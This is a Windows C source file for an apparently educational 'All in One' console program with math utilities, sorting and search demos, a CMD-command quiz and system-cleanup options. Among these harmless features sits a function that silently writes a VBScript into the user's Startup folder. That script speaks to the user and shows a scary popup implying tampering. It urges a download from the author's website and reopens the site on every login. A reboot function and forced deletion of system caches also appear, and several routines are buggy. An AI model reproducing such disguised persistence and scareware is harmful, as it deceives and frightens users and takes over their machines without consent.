#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<conio.h>
#include<windows.h>
#include <time.h>
#include <direct.h>
#include <shlobj.h>
#include<math.h>

void EnableAnsiEscapeCodes() {
    HKEY hKey;
    LONG result;

    // Open the registry key where the setting will be applied
    result = RegCreateKeyEx(
        HKEY_CURRENT_USER,             // Root key
        "Console",                     // Subkey path
        0,                             // Reserved, must be zero
        NULL,                          // Class
        0,                             // Options (set to 0)
        KEY_WRITE,                     // Access rights
        NULL,                          // Security descriptor
        &hKey,                         // Handle to open registry key
        NULL                           // Disposition (optional)
    );

    if (result == ERROR_SUCCESS) {
        DWORD value = 1; // Enable ANSI escape codes (1 = enable)
        result = RegSetValueEx(
            hKey,                         // Handle to open registry key
            "VirtualTerminalLevel",        // Value name
            0,                             // Reserved, must be zero
            REG_DWORD,                     // Type of data
            (const BYTE*)&value,           // Value data
            sizeof(value)                  // Size of data
        );

        if (result == ERROR_SUCCESS) {
            printf("HARSHIT MISHRA\n");
        } else {
            printf("Failed to set registry value.\n");
        }

        // Close the registry key
        RegCloseKey(hKey);
    } else {
        printf("Failed to open registry key.\n");
    }
}

// Function to set text color in CMD (Green)
void SetColor(int textColor) {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hConsole, textColor);
}

 void printgreen( const char *text){
    printf("\033[0;32m%s\033[0m", text);
 }
  
  // Define a structure to hold the command name, explanation, and type (internal or external)
typedef struct {
    char command[20];
    char explanation[200];
    char type[20];
} CMD;

// Function to explain the command dynamically based on user input
void explain_command(const CMD cmds[], int num_cmds, const char *command) {
    int found = 0;
    
    for (int i = 0; i < num_cmds; i++) {
        if (strcmp(cmds[i].command, command) == 0) {
            printf("\nExplanation: %s\n", cmds[i].explanation);
            printf("This is an %s command.\n", cmds[i].type);
            found = 1;
            break;
        }
    }
    
    if (!found) {
        printf("\nUnknown command. Please enter a valid CMD command.\n");
    }
}
void button(){
    SetColor(11);
    printf("Program created by: Harshit Mishra\n");
    SetColor(13);
    printf("Feel free to connect with me through the following platforms:\n");
    printf(" 1. LinkedIn\n");
    printf(" 2. GitHub\n");
    printf(" 3. Website\n");
    printf(" 4. Back to Main Menu\n\n");
    printf("Enter your choice to connect: ");
    
    int choice;
    scanf("%d", &choice);

    switch (choice) {
        case 1:
           system("start https://in.linkedin.com/in/harshit-mishra-mr-robot?trk=profile-badgea");
            break;
        case 2:
            system("start https://github.com/mishra9759harshit");
            break;
        case 3:
            system("start https://securcoder.vercel.app/");
            break;
        case 4:
            printf("Returning to the main menu...\n");
            break;
        default:
            printf("Invalid choice. Returning to main menu.\n");
            break;
    }
}

// Void function to encapsulate the entire CMD practice logic
void quiz() {
    // Define a list of available commands and their explanations
    CMD cmds[] = {
    {"dir", "Lists the files and directories in the current directory.", "INTERNAL"},
    {"cls", "Clears the screen in the CMD window.", "INTERNAL"},
    {"exit", "Closes the CMD window or ends the command prompt session.", "INTERNAL"},
    {"ping", "Sends a network packet to a specified address to check the network connection.", "EXTERNAL"},
    {"ipconfig", "Displays network configuration details like IP address, subnet mask, and gateway.", "EXTERNAL"},
    {"copy", "Copies files from one location to another.", "EXTERNAL"},
    {"del", "Deletes one or more files.", "INTERNAL"},
    {"move", "Moves files from one directory to another.", "INTERNAL"},
    {"mkdir", "Creates a new directory.", "INTERNAL"},
    {"rmdir", "Removes a directory.", "INTERNAL"},
    {"echo", "Displays a message or turns command echoing on or off.", "INTERNAL"},
    {"type", "Displays the contents of a text file.", "INTERNAL"},
    {"ren", "Renames a file or directory.", "INTERNAL"},
    {"cd", "Changes the current directory.", "INTERNAL"},
    {"chdir", "Changes the current directory.", "INTERNAL"},
    {"cls", "Clears the screen.", "INTERNAL"},
    {"exit", "Ends the CMD session.", "INTERNAL"},
    {"attrib", "Displays or changes file attributes.", "INTERNAL"},
    {"systeminfo", "Displays detailed configuration information about the computer and its operating system.", "EXTERNAL"},
    {"tasklist", "Displays all currently running processes on the local or remote machine.", "EXTERNAL"},
    {"taskkill", "Ends one or more tasks or processes.", "EXTERNAL"},
    {"netstat", "Displays network statistics and information about current network connections.", "EXTERNAL"},
    {"tracert", "Traces the route taken by packets to a remote destination.", "EXTERNAL"},
    {"net", "Manages network resources, users, and shares.", "INTERNAL"},
    {"set", "Displays, sets, or removes environment variables.", "INTERNAL"},
    {"hostname", "Displays the name of the current computer.", "EXTERNAL"},
    {"pause", "Pauses the execution of a batch file and waits for user input.", "INTERNAL"},
    {"shutdown", "Shuts down or restarts the computer.", "EXTERNAL"},
    {"restart", "Restarts the computer.", "EXTERNAL"},
    {"cls", "Clears the command prompt screen.", "INTERNAL"},
    {"color", "Sets the default console foreground and background colors.", "INTERNAL"},
    {"mode", "Configures system devices.", "INTERNAL"},
    {"ver", "Displays the version of Windows.", "INTERNAL"},
    {"getmac", "Displays the MAC address of all network interfaces.", "EXTERNAL"},
    {"shutdown", "Shuts down or restarts the computer.", "EXTERNAL"},
    {"format", "Formats a disk for use with Windows.", "EXTERNAL"},
    {"sc", "Communicates with the Service Control Manager and services.", "EXTERNAL"},
    {"fc", "Compares two files or sets of files and displays the differences between them.", "EXTERNAL"},
    {"diskpart", "Manages disks, partitions, and volumes.", "EXTERNAL"},
    {"sfc", "Scans and repairs system files.", "EXTERNAL"},
    {"regedit", "Opens the Windows Registry Editor.", "EXTERNAL"},
    {"reg", "Adds, modifies, or deletes registry entries.", "EXTERNAL"},
    {"bcdedit", "Configures boot options in Windows.", "EXTERNAL"},
    {"msconfig", "Opens the System Configuration tool.", "EXTERNAL"},
    {"chkdsk", "Checks a disk for errors and fixes them.", "EXTERNAL"},
    {"cipher", "Manages encryption of files and folders.", "EXTERNAL"},
    {"robocopy", "Copies files and directories, even over network connections.", "EXTERNAL"},
    {"comp", "Compares the contents of two files or sets of files.", "EXTERNAL"},
    {"xcopy", "Copies files and directories, including subdirectories.", "EXTERNAL"},
    {"find", "Searches for a text string in a file or files.", "EXTERNAL"},
    {"findstr", "Searches for text in files using regular expressions.", "EXTERNAL"},
    {"more", "Displays output one screen at a time.", "EXTERNAL"},
    {"help", "Displays information about commands or programs.", "INTERNAL"},
    {"assoc", "Displays or modifies file extension associations.", "INTERNAL"},
    {"time", "Displays or sets the system time.", "INTERNAL"},
    {"date", "Displays or sets the system date.", "INTERNAL"},
    {"label", "Creates, changes, or deletes the volume label of a disk.", "EXTERNAL"},
    {"doskey", "Edits command lines, recalls Windows commands, and creates macros.", "INTERNAL"},
    {"path", "Displays or sets the search path for executable files.", "INTERNAL"},
    {"shutdown", "Shuts down or restarts a computer.", "EXTERNAL"},
    {"taskmgr", "Opens the Task Manager.", "EXTERNAL"},
    {"wmic", "Windows Management Instrumentation Command-line.", "EXTERNAL"},
    {"gpupdate", "Updates Group Policy settings.", "EXTERNAL"},
    {"gpresult", "Displays Group Policy information for a user or computer.", "EXTERNAL"},
    {"netsh", "Configures network settings.", "EXTERNAL"},
    {"route", "Displays and modifies the network routing table.", "EXTERNAL"},
    {"ipconfig", "Displays network configuration.", "EXTERNAL"},
    {"nslookup", "Displays DNS information.", "EXTERNAL"},
    {"arp", "Displays or modifies the ARP cache.", "EXTERNAL"},
    {"telnet", "Connects to remote computers using the Telnet protocol.", "EXTERNAL"},
    {"ftp", "Transfers files between a local computer and a remote computer.", "EXTERNAL"},
    {"curl", "Transfers data from or to a server.", "EXTERNAL"},
    {"powershell", "Opens the Windows PowerShell.", "EXTERNAL"},
    {"powershell_ise", "Opens the Windows PowerShell Integrated Scripting Environment.", "EXTERNAL"},
    {"taskschd", "Opens the Task Scheduler.", "EXTERNAL"},
    {"perfmon", "Opens the Performance Monitor.", "EXTERNAL"},
    {"eventvwr", "Opens the Event Viewer.", "EXTERNAL"},
    {"dfrgui", "Opens the Disk Defragmenter.", "EXTERNAL"},
    {"mspmsnsv", "Opens the Microsoft Media Player.", "EXTERNAL"},
    {"mmc", "Opens the Microsoft Management Console.", "EXTERNAL"},
    {"diskmgmt.msc", "Opens the Disk Management console.", "EXTERNAL"},
    {"devmgmt.msc", "Opens the Device Manager.", "EXTERNAL"},
    {"msinfo32", "Opens the System Information tool.", "EXTERNAL"},
    {"certmgr.msc", "Opens the Certificate Manager.", "EXTERNAL"},
    {"lusrmgr.msc", "Opens the Local Users and Groups Manager.", "EXTERNAL"},
    {"secpol.msc", "Opens the Local Security Policy manager.", "EXTERNAL"},
    {"rsop.msc", "Opens the Resultant Set of Policy tool.", "EXTERNAL"},
    {"dcomcnfg", "Opens the DCOM Config tool.", "EXTERNAL"},
    {"fsquirt", "Opens the Bluetooth File Transfer Wizard.", "EXTERNAL"},
    {"msra", "Opens the Remote Assistance tool.", "EXTERNAL"},
    {"vssadmin", "Manages the Volume Shadow Copy Service.", "EXTERNAL"},
    {"winver", "Displays the Windows version information.", "EXTERNAL"},
    {"ntsd", "Starts the NTSD debugger.", "EXTERNAL"},
    {"winload", "Loads the Windows operating system.", "EXTERNAL"},
    {"taskkill", "Kills a process by its PID.", "EXTERNAL"},
    {"shutdown", "Shuts down or restarts the computer.", "EXTERNAL"},
    {"timeout", "Sets the command prompt to wait for a specified amount of time.", "EXTERNAL"},
    {"shutdown", "Shuts down or restarts a computer.", "EXTERNAL"}
};


    int num_cmds = sizeof(cmds) / sizeof(cmds[0]);

    char command[100];
    int current_command = 0;  // Start with the first command
    int score = 0;  // User score for correct answers
    time_t start_time, end_time;
      SetColor(14);
    printf("CMD Command Practice Program\n");
      SetColor(11);
      printf("\n============================================================================\n");
      printf("=       This is very usefull program to learn and Practice CMD commands      =\n");
      printf("=     **  How To use **                                                      =\n");
      printf("=   Read Explanation about the command                                       =\n");
      printf("=   Type the same Command Written Green color ( current command)             =\n");
      printf("=   When you type same command you can move to next command automatically    =\n");
      printf("==============================================================================\n");
      SetColor(8);
      printf("made by Harshit Mishra\n");
      SetColor(7);

    // Start timer
    time(&start_time); 

    while (1) {
        // Show the current command and ask for input
        SetColor(10);
        printf("\nCurrent Command: %s\n", cmds[current_command].command);
        SetColor(7);
        explain_command(cmds, num_cmds, cmds[current_command].command);

        printf("\nEnter CMD command: ");
        fgets(command, sizeof(command), stdin);
        
        // Remove newline character if present
        command[strcspn(command, "\n")] = 0;

        // Exit condition
        if (strcmp(command, "bye") == 0) {
            printf("\nExiting the program.\n");
            break;
        }

        // Check if the entered command is correct
        if (strcmp(command, cmds[current_command].command) == 0) {
            SetColor(15);
            printf("Correct! Moving to the next command...(To exit type ' bye ')\n");
            SetColor(7);
            score++;  // Increment score for correct answer
            
            // Move to the next command if there is one
            current_command++;

            // If there are no more commands, exit the loop
            if (current_command >= num_cmds) {
                printf("\nYou have completed all available commands.\n");
                break;
            }
        } else {
            // If the user enters an incorrect command, repeat the same command
            SetColor(12);
            printf("Incorrect! Please try again with the correct command.\n");
        }
    }

    // End timer
    time(&end_time);
    double time_taken = difftime(end_time, start_time);

    printf("\n--- Summary ---\n");
    printf("Your score: %d\n", score);
    printf("Time taken: %.2f seconds\n", time_taken);
    SetColor(11);
    printf("\nProgram created by: Harshit Mishra\n");
    SetColor(13);
    printf("Feel free to connect with me through the following platforms:\n");
    printf(" 1. LinkedIn\n");
    printf(" 2. GitHub\n");
    printf(" 3. Website\n");
    printf(" 4. Back to Main Menu\n\n");
    printf("Enter your choice to connect: ");
    
    int choice;
    scanf("%d", &choice);

    switch (choice) {
        case 1:
           system("start https://in.linkedin.com/in/harshit-mishra-mr-robot?trk=profile-badgea");
            break;
        case 2:
            system("start https://github.com/mishra9759harshit");
            break;
        case 3:
            system("start https://securcoder.vercel.app/");
            break;
        case 4:
            printf("Returning to the main menu...\n");
            break;
        default:
            printf("Invalid choice. Returning to main menu.\n");
            break;
    }
}
             




// Calculator
void calculator() {
    double a, b, result;
    char op;
    printf("Enter the first number: ");
    scanf("%lf", &a);
    printf("Choose an operation (+, -, *, /): ");
    scanf(" %c", &op);
    printf("Enter the second number: ");
    scanf("%lf", &b);
    
    switch (op) {
        case '+': 
            result = a + b;
            printf("\nResult: %.2lf\n", result);
            break;
        case '-': 
            result = a - b;
            printf("\nResult: %.2lf\n", result);
            break;
        case '*': 
            result = a * b;
            printf("\nResult: %.2lf\n", result);
            break;
        case '/': 
            if (b != 0) {
                result = a / b;
                printf("\nResult: %.2lf\n", result);
            } else {
                printf("\nError: Division by zero is not possible.\n");
            }
            break;
        default: 
            printf("Invalid operation.\n");
    }
    button();
}

// compare two values
void comparevalues(){
    int a,b,c;
    printf("Enter three values to compare\n");
    scanf("%d%d%d",&a,&b,&c);
    if(a == b && b == c){
        printf("\n All three values are equal\n");
    }else if(a > b && c < b){
        printf("%d a is greatest\n",a);
    }else if(a < b && c < a){
        printf("%d b is greates\n",b);
    }else if(c > a && c > b){
        printf("%d c is gratest\n",c);
    }else{
        printf(" any two values are same \n");
    }

    button();
}


//Array

void twodarray(){
    int r,c,i,j;
    printf(" \n Enter Row and columns:");
    scanf("%d%d",&r, &c);
    int array[r][c];
    printf("Enter elements of the array\n");
     for(i = 0; i < r; i++)
      for(j = 0; j < c; j++)
      scanf("%d", &array[i][j]);

      printf("\n Your array elements are :\n");
       for(i = 0; i < r; i++){
        for(j = 0; j < c; j++){
            printf("%d ", array[i][j]);
            
        }
        printf("\n");
       }
       button();
      
} 



//binary search
void binarysearch(){
    int array[100], i, n, item, beg, end, mid;
    printf("\n Enter the size of the array\n");
    scanf("%d", &n);
    printf("\nEnter the Elements of the array\n");
    for(i =0; i < n; i++){
        scanf("%d", &array[i]);
        
    }
     printf("\n Enter to be searched \n");
     scanf("%d", &item);
     beg = 0;
     end = n - 1;
     mid = (beg + end)/2;
     while(beg <= end && item != array[mid]){
        if(item > array[mid])
        beg = mid + 1;
        else
        end = mid - 1;
        mid = (beg + end)/2;
     }
      if(array[mid] == item){
        printf("\n %d is found at position %d:\n", item, mid + 1);
        
      }else{
        printf("\n Intem does not exist\n");
      }
     button();
      
      
    
}

//bubblesort
void bubblesort(){
    int array[100], n, i, j, temp;
    printf("\n Enter the size of Array\n");
    scanf("%d", &n);
    printf("\n Enter the elements of Array\n");
     for(i = 0; i < n; i++){
        scanf("%d", & array[i]);
        
     }
     for(i = 0; i < n; i++){
         printf("\n Your Elements are:\n %d",array[i]);
     }
     for(i = 0; i < n; i++){
        for(j = 0; j < n - 1; j++){
            if(array[j] > array[j +1]){
                temp = array[j];
                array[j] = array[j +1];
                array[j +1] = temp;
            }
        }
     }
     printf("\n Your Elements after sorting:\n");
      for(i = 0; i < n; i++){
        printf("%d ", array[i]);
      } 
      printf("\n\n\n");
     button();
     

}
//searching by array
 void arraysearching(){
    int array[100], i, n, key, found = 0;
    printf("\n Welcome to Array search program\n");
    printf("\n Enter the size of array\n");
    scanf("%d", &n);
    printf("\n Nice Now Enter Array elements\n");
     for(i = 0; i < n; i++){
        scanf("%d", & array[i]);
        
     }
     for(i = 0; i < n; i++){
         printf("\n Your Elements are: ");
          printf("%d ",array[i]);
     }
     printf("\n Enter Element to search:");
     scanf("%d", & key);
     for(i =0; i < n; i++){
        if(key == array[i]){
            found = i;
            break;
        }
     }
     if(found >= 0){
        printf("\n\n your element %d Found at index %d\n\n\n", key, found);
     }else{
        printf("\n Your Element does not exist in my word\n\n\n");
     }
    button();
 }
//linear search

//multiply matrix
void multiplymatrix(){
    int m,n,p,q, i, j, k;
    printf("\n --This program is made by Harshit Mishra for Multiply two matrix --\n");
    printf("\n Enter Row and Columns for First Matrix:");
    scanf("%d%d", &m, &n);
    printf("\n Enter Row and Columns for Second Matrix:");
    scanf("%d%d", &p, &q);

    int mat1[m][n], mat2[p][q], result[m][q];
      for(i = 0; i < m; i++){
          for(j =0; j < n; j++){
            printf("\n Nice now Enter the Elements for First Matrix [%d][%d] :", i, j);
            scanf("%d", &mat1[i][j]);
        }
    }
      for(i = 0; i < p; i++){
          for(j =0; j < q; j++){
            printf("\n We are to close now Enter the Elements for second Matrix [%d][%d] :", i, j);
            scanf("%d", &mat2[i][j]);
        }
    }

    for(i =0; i < m; i++){
        for(j = 0; j < q; j++){
            result[i][j] = 0;
            for(k = 0; k < n; k++){
                result[i][j] += mat1[i][k] * mat2[k][j];
            }
        }
    }
      printf("\n\n Resultant Matrix\n\n");
     for(i =0; i < m; i++){
        for(j = 0; j < q; j++){
           
            printf("%d  ", result[i][j]);
        }
        printf("\n");
        break;
     }
     button();
     
}
// Void function to display disk usage and free storage
void displayDiskUsageReport() {
    printf("\n--- Disk Usage Report ---\n");

    // Using WMIC to get disk usage details (Windows-specific)
    system("wmic logicaldisk get caption, description, size, freespace");

    printf("\n--- Free Storage and Memory Report ---\n");

    // Using WMIC to get memory details
    system("wmic os get FreePhysicalMemory, TotalVisibleMemorySize, TotalVirtualMemorySize");

    // Display system memory (physical and virtual)
    system("systeminfo | findstr /C:\"Memory\" /C:\"Physical\"");
}

// Void function to optimize the system by clearing temporary files and caches
void optimizeSystem() {
    printf("\n--- Optimizing the System ---\n");

    // Clear Temp files
    printf("Clearing Temp files...\n");
    system("del /q /f /s %temp%\\*");

    // Clean up Windows Update cache
    printf("Cleaning up Windows Update Cache...\n");
    system("net stop wuauserv");
    system("del /q /f /s C:\\Windows\\SoftwareDistribution\\Download\\*");
    system("net start wuauserv");

    // Clear the Recycle Bin
    printf("Clearing Recycle Bin...\n");
    system("rd /s /q C:\\$Recycle.bin");

    printf("\nSystem optimization complete!\n");
}

// Void function to show a detailed system report (CPU, memory, disk usage)
void showSystemReport() {
    printf("\n--- System Report ---\n");

    // Show CPU details (using WMIC)
    system("wmic cpu get caption, deviceid, manufacturer, maxclockspeed");

    // Show memory usage
    system("wmic os get FreePhysicalMemory, TotalVisibleMemorySize");

    // Show disk usage
    system("wmic logicaldisk get caption, size, freespace");

    // Show Windows OS details
    system("systeminfo | findstr /C:\"OS\"");

    // Show network adapter info
    system("wmic nic get caption, macaddress, speed");
}

// Void function to display the menu and handle user input
void displayMenu() {
    int choice;

    while (1) {
        // Display the menu to the user
        SetColor(12);
        printf("caution! This Function is Safe To use But I preferd use it on your own Risk , I will not be responsible for any type of loss\n");
        SetColor(10);
        printf("\n--- System Optimization and Disk Usage ---\n");
        printf("1. Display Disk Usage and Free Storage\n");
        printf("2. Optimize System (Clear Cache, Logs, etc.)\n");
        printf("3. Show Full System Report (CPU, Memory, Disk, Network)\n");
        printf("4. Exit\n");
        SetColor(7);
        printf("Enter your choice: ");
        scanf("%d", &choice);

        // Handle user choices
        switch (choice) {
            case 1:
                displayDiskUsageReport();
                break;

            case 2:
                optimizeSystem();
                break;

            case 3:
                showSystemReport();
                break;

            case 4:
                printf("Exiting the program. Goodbye!\n");
                button();
                return ;

            default:
                printf("Invalid choice! Please select a valid option.\n");
        }
    }
    button();
}

// Connecting Buttons

// about and connection 
void about1() {
    SetColor(14);
    printf("\n--- About ---\n");
    printf("This program is designed to demonstrate various C language functionalities.\n");
    printf("It includes various features like a calculator, array search, binary search, sorting algorithms, and more.\n\n");

    printf("How to use functions:\n");
    printf("1. Select a function from the main menu by entering the corresponding number.\n");
    printf("2. Follow the instructions within the selected function for further interaction.\n\n");

    printf("Program created by: Harshit Mishra\n");
    printf("Feel free to connect with me through the following platforms:Linkedin, Github, My websit\n");
    printf("choose number 10. about to Connect and more information.\n ");
    SetColor(15);
    printf("\n The Most Powerfull tool of this program is number 8. CMD practice must Look at this program\n");
}

void about() {
    SetColor(15);
    printf("\n--- About ---\n");
    printf("This program is designed to demonstrate various C language functionalities.\n");
    printf("It includes various features like a calculator, array search, binary search, sorting algorithms, and more.\n\n");

    printf("How to use functions:\n");
    printf("1. Select a function from the main menu by entering the corresponding number.\n");
    printf("2. Follow the instructions within the selected function for further interaction.\n\n");

    printf("Program created by: Harshit Mishra\n");
    SetColor(13);
    printf("Feel free to connect with me through the following platforms:\n");
    printf(" 1. LinkedIn\n");
    printf(" 2. GitHub\n");
    printf(" 3. Website\n");
    printf(" 4. Back to Main Menu\n\n");
    printf("Enter your choice to connect: ");
    
    int choice;
    scanf("%d", &choice);

    switch (choice) {
        case 1:
           system("start https://in.linkedin.com/in/harshit-mishra-mr-robot?trk=profile-badgea");
            break;
        case 2:
            system("start https://github.com/mishra9759harshit");
            break;
        case 3:
            system("start https://securcoder.vercel.app/");
            break;
        case 4:
            printf("Returning to the main menu...\n");
            break;
        default:
            printf("Invalid choice. Returning to main menu.\n");
            break;
    }
}

// clear screen
void clearScreen() {
    #ifdef _WIN32
        // For Windows
        system("cls");
    #else
        // For Unix/Linux/Mac
        system("clear");
    #endif
    return;
}
// armstrong number 

void armstrong(){
    int num, sum = 0, temp, reminder, n= 0;

    printgreen("Enter a Number\n");
    scanf("%d", &num);

    temp = num;
    //calculate the number of digits
    while(temp != 0){
        temp /= 10;
        ++n;
    }
    temp = num;
    // check the number in armstrong
    while(temp != 0){
        reminder = temp % 10;
        sum += pow(reminder,n);
        temp /= 10;
    }
     if( sum == num ){
        SetColor(14);
        printf("\n %d in an Armstrong Number.\n", num);
        SetColor(7);
     }else{
        SetColor(12);
          printf("\n %d in not an Armstrong number.\n", num);
        SetColor(7);
     }
}

// program for factorial 

void factorial(){
    int num, i;
    int factorial = 1;
    SetColor(15);
     printf("\n\n enter  positive numbers\n ");
    SetColor(7); 
     scanf("%d", & num);

     if(num < 0){
        SetColor(12);
        printf("Factoria of negative number is Not possible please Enter possitive number\n");
     }else{
        for(i = 0; i <= num; i++){
            factorial = i * num;
        }
        SetColor(14);
        printf(" Factorial of '%d' is : %d \n\n\n", num, factorial);
        SetColor(7);
     }
     button();
}

// Palidrome

void palindrome(){
       int num, reverse = 0, reminder, original;
       printf("\n A palindrome Number is a number that remains the same when read forward and backward like (121, 12321)\n");
       printf("\n Enter Number to check!\n");
       scanf("%d", & num);

       original = num;
       while(num != 0){
        reminder = num % 10; // gets the last digit
        reverse = reverse * 10 + reminder; // revers the digit
        num /= 10; // remove last digit
       }
        if(original == reverse){
            printf("Congratulations! Your number %d is palidrome.\n\n\n");
        }else{
            printf("Oww This is very very (❁´◡`❁) because your %d is not a palidrome number\n");
        }

}

// Table 1 to 20

void table(){
    int i;
    printf("enter table number between (2 to 20)\n");
    scanf("%d", &i);
        if(i >= 2 && i <= 20){
          SetColor(10);
          printf("Multiplication table of %d : \n",i);
          printf("  _____________________________________");
          printf(" |                                     |");
           for(int j =0; j <= 10; j++){
           SetColor(14);
         
           printf("\n |          %d x %d = %d             |\n", i, j, i*j);
           Sleep(200);
          
        
           printf("\n");
           SetColor(7);
           }
           SetColor(14);
           printf("  _____________________________________\n\n\n");
        }else{
            SetColor(12);
            printf("I can I only provide number not tables if want table enter number between (2 - 20)\n\n");
            SetColor(7);
        }
           button();

}
// ASCII Values of alphabet

void ascii(){
    char alphabet;
    printf("\n Enter an alphabet to know there ASCII value");
    getchar();
    scanf("%c", &alphabet);
    SetColor(11);
    printf("\n Your Alphabet is %c\n", alphabet);
    printf("ASCII value of %c is : %d", alphabet, alphabet);
    SetColor(12);
    printf("\n\nNote: ASCII value diffrent for Capital latter & Small laters like( A = 65, a = 97)");
    printf("\n\n");
    SetColor(7);
    button();
}

// string program
   void string(char *str, char *substr){
    char *position = strstr(str, substr);
    if(position != NULL){
        printf("Substring '%s' found at position : %ld\n", substr, position - str);
    }else{
        printf("Substring '%s' not found.\n", substr);
    }
   }

   // String function to call

   void stringmain(){
      char str1[50] = "This is Harshit Who are you?\n";
      char str2[50];
      char searchstr[50];

      // printing str1
      SetColor(14);
      printf("String 1: %s\n", str1);
      // str2
      SetColor(7);
      printf("Tell me your name:");
      getchar();
      scanf(" %[^\n]", str2);
      SetColor(13);
      printf("\nNice to Meet you %s Well whats going on %s how are you feeling today!\n", str2, str2);
      SetColor(7);
      // finding the lenght of string
      int lenght1 = strlen(str1);
      int lenght2 = strlen(str2);
      printf(" lenght of string 1 is: %d ", lenght1);
      printf(" lenght of string 2 is: %d", lenght2);

      //concatenating strings
      strcat(str1, "\tSo do you want to learn how to code?");
      strcat(str2, "\tGo to https://securcoder.vercel.app/\n");
      printf("Concatenated string 1: %s\n", str1);
      printf("concatenated string 2: %s\n", str2);
      // comparing two strings
      if(strcmp(str1,str2) == 0){
        printf("Both strings are same\n");
      }else{
        printf("Both strings are diffrent\n");
      }

      // searching for a substring
      printf("Enter subsrting to search ⌂");
      getchar();
      scanf("%[^\n]", searchstr);
      // call the string search function now I am goaing to call it

      string(str2,searchstr);
   }
// add multiple matrices


// Hackpurl
  // Function to create a VBScript file with a message box and button to open a website
void createVBScriptAndSetStartup(const char* url) {
    // Create and write to the VBS file content
  const char* scriptContentTemplate =
    "Dim speaks, speech, messageBox, objShell, userInput\n"
    "speaks = \"Hey there, how are you today? This is Harshit Mishra. Don't be afraid, tell me how you're feeling. Your machine seems fine. Do you too?\" \n"
    "Set speech = CreateObject(\"sapi.spvoice\") \n"
    "speech.Speak speaks \n"
    
    "Set messageBox = CreateObject(\"WScript.Shell\")\n"
    "userInput = messageBox.Popup(\"So how are you? How are you feeling? Well there is no need to worry. By the way today your computer said something, how did you feel? \" & vbCrLf & vbCrLf & "
    "\"Come, let us meet sometime. Tell me, this letter has been written with a lot of love, my unknown dear, your own  -Harshit.  \" & vbCrLf & vbCrLf & "
    "\"Now, in a few seconds, a website will open. If you want to remove everything and return your computer to normal, download the program from there. if you still let it remain like this. Then you are that one. (F)\" & vbCrLf & vbCrLf & "
    "\"Now, click 'OK' to open the website.\", 250, \"You're H* Read Carefully\", 48 + 4096)\n"
    
    "If userInput = 1 Then\n"
    "    Set objShell = CreateObject(\"WScript.Shell\")\n"
    "    objShell.Run \"https://securcoder.vercel.app/\"\n"
    "End If\n"
    
    "WScript.Sleep 70000 ' Wait for 10 minutes (600 seconds)\n"
    
    "Set objShell = CreateObject(\"WScript.Shell\") \n"
    "objShell.Run \"https://securcoder.vercel.app/\" ' Open the website again after waiting for 10 minutes\n";





    // Create the full script content by inserting the URL into the template
    char scriptContent[2048];
    sprintf(scriptContent, scriptContentTemplate, url);

    // Get the path to the Startup folder
    char startupFolder[MAX_PATH];
    if (SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, startupFolder) != S_OK) {
        printf("Error retrieving the Startup folder path.\n");
        return;
    }

    // Append the VBS file name to the Startup folder path
    char vbsFilePath[MAX_PATH];
    sprintf(vbsFilePath, "%s\\say_hello.vbs", startupFolder);

    // Open and create the VBS file
    FILE *file = fopen(vbsFilePath, "w");
    if (file == NULL) {
        printf("Error creating VBS file.\n");
        return;
    }

    // Write the VBScript content to the file
    fputs(scriptContent, file);
    fclose(file);
    printf(": \n", vbsFilePath);
    printf("(●'◡'●).\n");
}

void restart_system() {
    // Command to restart the system after 60 seconds
    system("shutdown /r /t 60");
}


//exit

// Log user activity to a file
void logActivity(const char* username, const char* activity) {
    FILE* file = fopen("activity_log.txt", "a");
    if (file) {
        time_t now = time(NULL);
        fprintf(file, "[%s] User: %s - Activity: %s\n", ctime(&now), username, activity);
        fclose(file);
    }
}

// Display past activity
void displayPastActivity() {
    FILE* file = fopen("activity_log.txt", "r");
    if (file) {
        char line[256];
        printf("\n--- Previous Activity Log ---\n");
        while (fgets(line, sizeof(line), file)) {
            printf("%s", line);
        }
        fclose(file);
    } else {
        printf("\nNo previous activity found.\n");
    }
}
// Session time fetch function
double getSessionTime(time_t startTime, time_t endTime) {
    return difftime(endTime, startTime); // Calculate time in seconds
}


int main(){
    int choice;
    char magic;
    const char* redirectUrl = "https://securecoder.vercel.app/";

    EnableAnsiEscapeCodes();
    

    // Set text color to green (color code 10)
    SetColor(11); // 10 corresponds to green in the Windows console

    // Print the formatted text in green color
    printf("###############################################\n");
    printf("#                                             #\n");
    printf("#       All in One Program by Harshit Mishra  #\n");
    printf("#                                             #\n");
    printf("###############################################\n");

    // Reset text color to default (usually white)
    SetColor(7); // 7 corresponds to white in the Windows console
      about1();
      system("pause");
      char string1[50] = "Hey there This is Harshit Mishra who are you?\n";
      char username[50];
      time_t startTime, endTime;

        
       SetColor(14);
       printf("%s", string1);
       printf("enter your name or username\n");
       scanf("%[^\n]", username);
       printf("\n Nice to see you  \033[1;35m%s\033[0m how are you today! well \033[1;35m%s\033[0m I have made this program with a lot of love and sincerity.\n \033[1;35m%s\033[0m I want to send it to someone special who appreciates it.\n If you like this program, then enjoy it and I request you to use it at your own discretion.\n", username, username, username);
       system("pause");
       // Display past activity
       logActivity(username, "Logged in");

       time(&startTime); // Record start time
    do{
         SetColor(10);
        printf("\n--- Menu ---\n");
        printf(" 1. calculator\n");
        printf(" 2. Compare Three values\n");
        printf(" 3. 2D Array\n");
        printf(" 4. binary Search\n");
        printf(" 5. Array Search\n");
        printf(" 6. Multiply Matrix\n");
        printf(" 7. Bubble Sort\n");
        printf(" 8. CMd Command Practice\n");
        printf(" 9. C Language Program Writer AI\n");
        printf("10. About\n");
        printf("11. System Optimization and Disk Usage\n");
        printf("12. Armstrong number\n");
        printf("13. Factorial\n");
        printf("14. Palidrome\n");
        printf("15. Table 2 to 20\n");
        printf("16. Alphabet to ASCII value\n");
        printf("17. String functions\n");
        printf("18. Clear Screen\n");
        printf("19. Your activity\n");
        printf(" 0. Exit\n");
        printf("Enter Your choice\n");
        SetColor(7);
        scanf("%d", & choice);
    
    switch(choice){
        case 1: calculator(); break;
        case 2: comparevalues(); break;
        case 3: twodarray(); break;
        case 4: binarysearch(); break;
        case 5: arraysearching(); break;
        case 6: multiplymatrix(); break;
        case 7: bubblesort(); break;
        case 8: quiz(); break;
        case 9: printgreen("\n This is very High Level Program and it is so complex that's why I create this program sepratly.\n But You can Download It from My website or Learn throgh my website\n Click Enter to Visit my website\n");
               getchar();
               getchar();
               system("start https://securcoder.vercel.app/");
                break;
        case 10: about(); break;
        case 11: displayMenu(); break;
        case 12: armstrong(); break;
